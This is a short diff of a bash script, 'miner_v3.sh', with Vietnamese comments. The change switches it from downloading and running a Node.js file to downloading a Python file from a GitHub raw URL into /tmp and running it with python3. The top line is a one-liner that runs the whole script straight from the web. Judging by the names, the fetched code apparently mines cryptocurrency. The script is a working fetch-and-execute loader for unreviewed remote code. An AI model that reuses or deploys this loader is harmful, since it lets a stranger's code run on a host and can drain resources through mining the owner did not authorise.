@@ -1,20 +1,18 @@
 # bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/miner_v3.sh)
+
+
 #!/bin/bash
 
-# Tải script Node.js từ URL
-echo "🚀 Đang tải script Node.js..."
-curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/min.js -o /tmp/min.js
+# Tải script Python từ URL
+echo "🚀 Đang tải script Python..."
+curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/min.py -o /tmp/miner.py
 
 # Kiểm tra xem script đã tải về thành công không
-if [ ! -f "/tmp/min.js" ]; then
-  echo "❌ Lỗi tải tệp script Node.js."
+if [ ! -f "/tmp/miner.py" ]; then
+  echo "❌ Lỗi tải tệp script Python."
   exit 1
 fi
 
-# Cài đặt module 'tar' nếu chưa có
-echo "🔧 Cài đặt module 'tar'..."
-npm install -g tar
-
-# Chạy script Node.js
-echo "🛠️ Đang chạy script Node.js..."
-node /tmp/min.js
+# Chạy script Python
+echo "🛠️ Đang chạy script Python..."
+python3 /tmp/miner.py
